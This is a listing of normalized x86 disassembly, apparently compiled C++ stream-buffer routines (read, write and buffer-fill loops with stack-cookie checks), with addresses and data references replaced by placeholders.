mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx ]
mov ecx [ ebp - 0x4 ]
add ecx [ eax + 0x4 ]
call sub_4106c0
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x8 ]
mov edx [ ecx ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
mov edx [ ebp - 0xc ]
add edx [ ecx + 0x4 ]
mov ecx edx
call sub_4106c0
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
mov ecx [ ebp - 0x10 ]
mov eax [ edx + 0x8 ]
call eax
sub_410860
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x34 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebp - 0x10 ] 0x0
push 0x1
mov ecx [ ebp - 0x8 ]
call sub_412110
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_4108b0
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_412fb0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
cmp [ ebp - 0xc ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov ecx [ ebp - 0x4 ]
mov eax [ edx + 0x18 ]
call eax
mov [ ebp - 0x8 ] eax
jg r-xdata
mov ecx [ ebp - 0x4 ]
call sub_412e20
push eax
call sub_40cac0
add esp 0x4
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jbe r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_410910
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
call sub_412fb0
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] edx
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov ecx [ ebp - 0x4 ]
call sub_412d30
mov [ ebp - 0x10 ] eax
call sub_40cb50
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x14 ]
push ecx
call sub_40cad0
add esp 0x8
movzx edx al
test edx edx
je r-xdata
jg r-xdata
mov ecx [ ebp - 0x4 ]
call sub_4108b0
mov [ ebp - 0x8 ] eax
call sub_40cb50
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
call sub_412f70
push eax
call sub_40cac0
add esp 0x4
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0x1c ] 0x1
jbe r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
sub_4109e0
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
mov ecx [ ebp - 0x4 ]
mov eax [ edx + 0x18 ]
call eax
mov [ ebp - 0xc ] eax
call sub_40cb50
mov [ ebp - 0x10 ] eax
lea ecx [ ebp - 0xc ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
call sub_40cad0
add esp 0x8
movzx eax al
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
call sub_412f20
push eax
call sub_40cac0
add esp 0x4
mov [ ebp - 0x8 ] eax
call sub_40cb50
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_410a40
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x14 ] ecx
xorpd xmm0 xmm0
movlpd [ ebp - 0x1c ] xmm0
mov eax [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0xc
jg r-xdata
mov ecx [ ebp - 0x14 ]
call sub_412fb0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
cmp [ ebp - 0xc ] 0x0
jl r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
mov ecx [ ebp - 0x14 ]
mov eax [ edx + 0x1c ]
call eax
mov [ ebp - 0x8 ] eax
call sub_40cb50
mov [ ebp - 0x20 ] eax
lea ecx [ ebp - 0x8 ]
push ecx
lea edx [ ebp - 0x20 ]
push edx
call sub_40cad0
add esp 0x8
movzx eax al
test eax eax
je r-xdata
jg r-xdata
lea ecx [ ebp - 0x8 ]
push ecx
call sub_40cab0
add esp 0x4
mov edx [ ebp + 0x8 ]
mov [ edx ] al
mov eax [ ebp + 0x8 ]
add eax 0x1
mov [ ebp + 0x8 ] eax
mov ecx [ ebp - 0x1c ]
add ecx 0x1
mov edx [ ebp - 0x18 ]
adc edx 0x0
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] edx
mov eax [ ebp + 0xc ]
sub eax 0x1
mov ecx [ ebp + 0x10 ]
sbb ecx 0x0
mov [ ebp + 0xc ] eax
mov [ ebp + 0x10 ] ecx
jmp r-xdata
mov eax [ ebp + 0x10 ]
cmp eax [ ebp - 0xc ]
jg r-xdata
cmp [ ebp - 0x10 ] 0x0
jbe r-xdata
cmp [ ebp + 0x10 ] 0x0
jl r-xdata
mov ecx [ ebp - 0x10 ]
push ecx
mov ecx [ ebp - 0x14 ]
call sub_412e20
push eax
mov edx [ ebp + 0x8 ]
push edx
call sub_401070
add esp 0xc
mov eax [ ebp - 0x10 ]
add eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebp - 0x1c ]
add ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x18 ]
adc edx [ ebp - 0xc ]
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] edx
mov eax [ ebp + 0xc ]
sub eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x10 ]
sbb ecx [ ebp - 0xc ]
mov [ ebp + 0xc ] eax
mov [ ebp + 0x10 ] ecx
mov edx [ ebp - 0x10 ]
push edx
mov ecx [ ebp - 0x14 ]
call sub_412e80
jmp r-xdata
jl r-xdata
jmp r-xdata
mov edx [ ebp + 0xc ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp - 0x10 ]
jae r-xdata
sub_410b90
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0x4 ] ecx
xorpd xmm0 xmm0
movlpd [ ebp - 0x1c ] xmm0
mov eax [ ebp - 0x1c ]
mov edx [ ebp - 0x18 ]
mov esp ebp
pop ebp
retn 0xc
jg r-xdata
mov ecx [ ebp - 0x4 ]
call sub_413070
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
cmp [ ebp + 0xc ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_40cac0
add esp 0x4
push eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
mov ecx [ ebp - 0x4 ]
mov eax [ edx + 0xc ]
call eax
mov [ ebp - 0x8 ] eax
call sub_40cb50
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x8 ]
push ecx
lea edx [ ebp - 0xc ]
push edx
call sub_40cad0
add esp 0x8
movzx eax al
test eax eax
je r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
add ecx 0x1
mov [ ebp + 0x8 ] ecx
mov edx [ ebp - 0x1c ]
add edx 0x1
mov eax [ ebp - 0x18 ]
adc eax 0x0
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x18 ] eax
mov ecx [ ebp + 0xc ]
sub ecx 0x1
mov edx [ ebp + 0x10 ]
sbb edx 0x0
mov [ ebp + 0xc ] ecx
mov [ ebp + 0x10 ] edx
jmp r-xdata
mov eax [ ebp + 0x10 ]
cmp eax [ ebp - 0x10 ]
jg r-xdata
cmp [ ebp - 0x14 ] 0x0
jbe r-xdata
cmp [ ebp + 0x10 ] 0x0
jl r-xdata
mov ecx [ ebp - 0x14 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_412e40
push eax
call sub_401070
add esp 0xc
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebp - 0x1c ]
add ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
adc edx [ ebp - 0x10 ]
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] edx
mov eax [ ebp + 0xc ]
sub eax [ ebp - 0x14 ]
mov ecx [ ebp + 0x10 ]
sbb ecx [ ebp - 0x10 ]
mov [ ebp + 0xc ] eax
mov [ ebp + 0x10 ] ecx
mov edx [ ebp - 0x14 ]
push edx
mov ecx [ ebp - 0x4 ]
call sub_412fe0
jmp r-xdata
jl r-xdata
jmp r-xdata
mov edx [ ebp + 0xc ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp - 0x14 ]
jae r-xdata
sub_410cd0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ r--data ]
push eax
mov ecx [ r--data ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_413ed0
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x14
sub_410d00
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ r--data ]
push eax
mov ecx [ r--data ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_413ed0
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x20
sub_410d50
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0xc ] ecx
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0x8 ]
je r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn 0x4
push 0x0
push 0x1
mov ecx [ ebp - 0xc ]
call sub_40c030
lea ecx [ ebp - 0x1 ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_401a60
push eax
lea edx [ ebp - 0x2 ]
push edx
mov ecx [ ebp - 0xc ]
call sub_401a60
push eax
call sub_416860
add esp 0x8
movzx eax al
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_401a60
push eax
lea ecx [ ebp - 0x5 ]
push ecx
mov ecx [ ebp - 0xc ]
call sub_401a60
push eax
call sub_416860
add esp 0x8
movzx edx al
test edx edx
je r-xdata
xor ecx ecx
je r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
call sub_402180
add esp 0x4
push eax
mov ecx [ ebp - 0xc ]
call sub_4130a0
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp + 0x8 ]
call sub_413150
mov ecx [ eax ]
push ecx
lea edx [ ebp - 0x14 ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_413120
mov eax [ eax ]
push eax
mov ecx [ ebp - 0xc ]
call sub_4168f0
jmp r-xdata
lea edx [ ebp - 0x3 ]
push edx
mov ecx [ ebp + 0x8 ]
call sub_401a60
push eax
mov ecx [ ebp - 0xc ]
call sub_4022a0
sub_410e30
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x1 ]
call sub_401a30
push eax
movzx eax [ ebp - 0x2 ]
push eax
movzx ecx [ ebp - 0x3 ]
push ecx
lea ecx [ ebp - 0x4 ]
call sub_413390
push eax
mov ecx [ ebp - 0x8 ]
call sub_413180
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_410e70
push ebp
mov ebp esp
push 0xffffffff
push sub_43b618
mov eax [ fs : 0x0 ]
push eax
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] ecx
push 0x1
lea ecx [ ebp - 0x14 ]
call sub_40e070
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x14 ]
push ecx
mov ecx [ ebp - 0x18 ]
call sub_413220
lea edx [ ebp - 0x28 ]
push edx
mov ecx [ ebp - 0x18 ]
call sub_410f70
push eax
lea ecx [ ebp - 0x14 ]
call sub_411e00
movzx eax al
test eax eax
je r-xdata
lea ecx [ ebp - 0x14 ]
call sub_413db0
add eax 0x18
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x4
mov [ ebp - 0x20 ] 0x0
push 0x0
lea ecx [ ebp - 0x20 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x4c ]
call sub_416940
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x24 ]
push ecx
lea edx [ ebp - 0x30 ]
push edx
mov ecx [ ebp - 0x18 ]
call sub_4169c0
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x4c ]
call sub_412140
sub_410fb0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_413220
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn 0x8
sub_411090
push ebp
mov ebp esp
push 0xffffffff
push sub_43b2d2
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x14 ] 0x0
cmp [ ebp + 0x14 ] 0x0
je r-xdata
push 0x0
push 0x0
mov edx [ ebp - 0x10 ]
add edx 0x10
push edx
mov ecx [ ebp - 0x10 ]
call sub_412760
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
mov edx [ ecx + 0x4 ]
mov eax [ ebp - 0x10 ]
mov [ eax + edx ] r--data
mov ecx [ ebp - 0x10 ]
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
sub eax 0x70
mov ecx [ ebp - 0x10 ]
mov edx [ ecx ]
mov ecx [ edx + 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ edx + ecx - 0x4 ] eax
push 0x0
mov ecx [ ebp - 0x10 ]
add ecx 0x10
call sub_413840
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
or ecx 0x1
push ecx
mov ecx [ ebp + 0x8 ]
call sub_40be90
push eax
mov ecx [ ebp - 0x10 ]
add ecx 0x10
call sub_4138e0
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
mov [ eax ] r--data
mov ecx [ ebp - 0x10 ]
add ecx 0x70
call sub_412740
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x14 ]
or ecx 0x1
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x10
push 0x0
push 0x2
mov edx [ ebp - 0x10 ]
mov eax [ edx ]
mov ecx [ ebp - 0x10 ]
add ecx [ eax + 0x4 ]
call sub_410690
sub_4111a0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax - 0x70 ]
mov edx [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov [ eax + edx - 0x70 ] r--data
mov ecx [ ebp - 0x4 ]
mov edx [ ecx - 0x70 ]
mov eax [ edx + 0x4 ]
sub eax 0x70
mov ecx [ ebp - 0x4 ]
mov edx [ ecx - 0x70 ]
mov ecx [ edx + 0x4 ]
mov edx [ ebp - 0x4 ]
mov [ edx + ecx - 0x74 ] eax
mov ecx [ ebp - 0x4 ]
sub ecx 0x60
call sub_411250
mov ecx [ ebp - 0x4 ]
sub ecx 0x58
call sub_4106e0
mov esp ebp
pop ebp
retn
sub_411220
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp - 0x4 ]
add ecx 0x10
call sub_4139a0
test eax eax
jne r-xdata
mov esp ebp
pop ebp
retn
push 0x0
push 0x2
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
add edx [ ecx + 0x4 ]
mov ecx edx
call sub_410690
sub_411250
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov [ eax ] r--data
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x50 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
movzx eax [ edx + 0x4c ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
call sub_413d10
mov ecx [ ebp - 0x4 ]
call sub_410860
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
call sub_4139a0
sub_411290
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x50 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x50 ]
push edx
call sub_4240a8
add esp 0x4
sub_4112c0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x50 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x50 ]
push edx
call sub_424117
add esp 0x4
sub_4112f0
push ebp
mov ebp esp
push 0xffffffff
push sub_43bb48
mov eax [ fs : 0x0 ]
push eax
sub esp 0x68
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] ecx
call sub_40cb50
mov [ ebp - 0x54 ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x54 ]
push ecx
call sub_40cad0
add esp 0x8
movzx edx al
test edx edx
je r-xdata
mov ecx [ ebp - 0x38 ]
call sub_412e40
test eax eax
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_40cb00
add esp 0x4
jmp r-xdata
mov edx [ ebp - 0x38 ]
cmp [ edx + 0x50 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x38 ]
call sub_412e40
mov esi eax
mov ecx [ ebp - 0x38 ]
call sub_412ec0
cmp esi eax
jae r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x38 ]
call sub_413d10
mov eax [ ebp - 0x38 ]
cmp [ eax + 0x40 ] 0x0
jne r-xdata
call sub_40cb50
jmp r-xdata
lea ecx [ ebp + 0x8 ]
push ecx
call sub_40cab0
add esp 0x4
mov bl al
mov ecx [ ebp - 0x38 ]
call sub_413020
mov [ eax ] bl
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x64 ] 0x8
lea ecx [ ebp + 0x8 ]
push ecx
call sub_40cab0
add esp 0x4
mov [ ebp - 0x12 ] al
push 0x0
push 0x8
lea ecx [ ebp - 0x2c ]
call sub_412240
mov [ ebp - 0x4 ] 0x0
mov ecx [ ebp - 0x38 ]
mov edx [ ecx + 0x50 ]
push edx
lea eax [ ebp + 0x8 ]
push eax
call sub_40cab0
add esp 0x4
movzx ecx al
push ecx
call sub_40de30
add esp 0x8
movzx edx al
test edx edx
je r-xdata
call sub_40cb50
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x2c ]
call sub_401830
mov eax [ ebp - 0x58 ]
jmp r-xdata
cmp [ ebp - 0x40 ] 0x1
jle r-xdata
call sub_40cb50
mov [ ebp - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x48 ] eax
jmp r-xdata
lea ecx [ ebp - 0x68 ]
push ecx
lea ecx [ ebp - 0x2c ]
call sub_4123e0
mov ecx eax
call sub_413dd0
mov edx [ ebp - 0x34 ]
sub edx eax
mov [ ebp - 0x3c ] edx
je r-xdata
cmp [ ebp - 0x40 ] 0x3
je r-xdata
mov eax [ ebp - 0x48 ]
jmp r-xdata
mov ecx [ ebp - 0x38 ]
mov [ ecx + 0x45 ] 0x1
lea edx [ ebp - 0x12 ]
cmp [ ebp - 0x30 ] edx
je r-xdata
mov eax [ ebp - 0x38 ]
mov ecx [ eax + 0x50 ]
push ecx
mov edx [ ebp - 0x3c ]
push edx
push 0x1
lea eax [ ebp - 0x6c ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_4123e0
mov ecx eax
call sub_413dd0
push eax
call sub_422d75
add esp 0x10
cmp [ ebp - 0x3c ] eax
je r-xdata
mov ecx [ ebp - 0x38 ]
mov edx [ ecx + 0x50 ]
push edx
movzx eax [ ebp - 0x12 ]
push eax
call sub_40de30
add esp 0x8
movzx ecx al
test ecx ecx
je r-xdata
jmp r-xdata
cmp [ ebp - 0x3c ] 0x0
jbe r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x2c ]
call sub_401830
mov eax [ ebp - 0x60 ]
jmp r-xdata
call sub_40cb50
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x2c ]
call sub_401830
mov eax [ ebp - 0x5c ]
jmp r-xdata
call sub_40cb50
mov [ ebp - 0x44 ] eax
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x44 ] edx
jmp r-xdata
lea ecx [ ebp - 0x2c ]
call sub_401890
cmp eax 0x20
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x2c ]
call sub_401830
mov eax [ ebp - 0x50 ]
jmp r-xdata
call sub_40cb50
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x2c ]
call sub_401830
mov eax [ ebp - 0x4c ]
jmp r-xdata
push 0x0
push 0x8
lea ecx [ ebp - 0x2c ]
call sub_412330
jmp r-xdata
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x34 ]
push edx
lea eax [ ebp - 0x74 ]
push eax
lea ecx [ ebp - 0x2c ]
call sub_4123e0
mov ecx eax
call sub_413dd0
mov esi eax
lea ecx [ ebp - 0x2c ]
call sub_401890
add esi eax
push esi
lea ecx [ ebp - 0x70 ]
push ecx
lea ecx [ ebp - 0x2c ]
call sub_4123e0
mov ecx eax
call sub_413dd0
push eax
lea edx [ ebp - 0x30 ]
push edx
lea eax [ ebp - 0x11 ]
push eax
lea ecx [ ebp - 0x12 ]
push ecx
mov edx [ ebp - 0x38 ]
add edx 0x48
push edx
mov eax [ ebp - 0x38 ]
mov ecx [ eax + 0x40 ]
call sub_413fe0
mov [ ebp - 0x40 ] eax
cmp [ ebp - 0x40 ] 0x0
jl r-xdata
sub_4115d8
mov [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x2c ]
call sub_401830
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn 0x4
sub_411610
push ebp
mov ebp esp
sub esp 0x14
push esi
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0x8 ]
call sub_412e20
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x50 ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
call sub_412e00
mov esi eax
mov ecx [ ebp - 0x8 ]
call sub_412e20
cmp esi eax
jae r-xdata
call sub_40cb50
jmp r-xdata
call sub_40cb50
mov [ ebp - 0x14 ] eax
lea ecx [ ebp + 0x8 ]
push ecx
lea edx [ ebp - 0x14 ]
push edx
call sub_40cad0
add esp 0x8
movzx eax al
test eax eax
je r-xdata
call sub_40cb50
mov [ ebp - 0xc ] eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
push ecx
call sub_40cad0
add esp 0x8
movzx edx al
test edx edx
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x8 ]
cmp [ ecx + 0x40 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x8 ]
call sub_412ee0
lea edx [ ebp + 0x8 ]
push edx
call sub_40cb00
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x8 ]
call sub_412e20
mov ecx 0x1
imul ecx ecx 0xffffffff
add eax ecx
push eax
call sub_40cac0
add esp 0x4
mov [ ebp - 0x10 ] eax
lea edx [ ebp + 0x8 ]
push edx
lea eax [ ebp - 0x10 ]
push eax
call sub_40cad0
add esp 0x8
movzx ecx al
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x8 ]
call sub_412e20
mov ecx [ ebp - 0x8 ]
add ecx 0x44
cmp eax ecx
je r-xdata
lea edx [ ebp + 0x8 ]
push edx
call sub_40cab0
add esp 0x4
mov [ ebp - 0x1 ] al
mov eax [ ebp - 0x8 ]
mov ecx [ eax + 0x50 ]
push ecx
lea edx [ ebp - 0x1 ]
push edx
call sub_40de70
add esp 0x8
movzx eax al
test eax eax
je r-xdata
call sub_40cb50
lea edx [ ebp + 0x8 ]
push edx
call sub_40cab0
add esp 0x4
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x44 ] al
mov ecx [ ebp - 0x8 ]
call sub_413d50
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
jmp r-xdata
sub_411760
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0xc ]
call sub_412e20
test eax eax
je r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax ]
mov ecx [ ebp - 0xc ]
mov eax [ edx + 0x1c ]
call eax
mov [ ebp - 0x8 ] eax
call sub_40cb50
mov [ ebp - 0x10 ] eax
lea ecx [ ebp - 0x8 ]
push ecx
lea edx [ ebp - 0x10 ]
push edx
call sub_40cad0
add esp 0x8
movzx eax al
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
call sub_412e20
mov esi eax
mov ecx [ ebp - 0xc ]
call sub_412e60
cmp esi eax
jae r-xdata
mov ecx [ ebp - 0x8 ]
push ecx
mov edx [ ebp - 0xc ]
mov eax [ edx ]
mov ecx [ ebp - 0xc ]
mov edx [ eax + 0x10 ]
call edx
mov eax [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
call sub_412e20
push eax
call sub_40cac0
add esp 0x4
jmp r-xdata
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
sub_411810
push ebp
mov ebp esp
push 0xffffffff
push sub_43bba8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x60
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] ecx
mov ecx [ ebp - 0x38 ]
call sub_412e20
test eax eax
je r-xdata
mov eax [ ebp - 0x38 ]
cmp [ eax + 0x50 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x38 ]
call sub_412e20
mov esi eax
mov ecx [ ebp - 0x38 ]
call sub_412e60
cmp esi eax
jae r-xdata
mov ecx [ ebp - 0x38 ]
call sub_413d10
mov ecx [ ebp - 0x38 ]
cmp [ ecx + 0x40 ] 0x0
jne r-xdata
call sub_40cb50
jmp r-xdata
mov ecx [ ebp - 0x38 ]
call sub_412f20
push eax
call sub_40cac0
add esp 0x4
jmp r-xdata
lea ecx [ ebp - 0x2c ]
call sub_40ffa0
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x13 ] 0x0
mov edx [ ebp - 0x38 ]
mov eax [ edx + 0x50 ]
push eax
lea ecx [ ebp - 0x13 ]
push ecx
call sub_40de00
add esp 0x8
movzx edx al
test edx edx
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_421ed7
mov esp ebp
pop ebp
retn
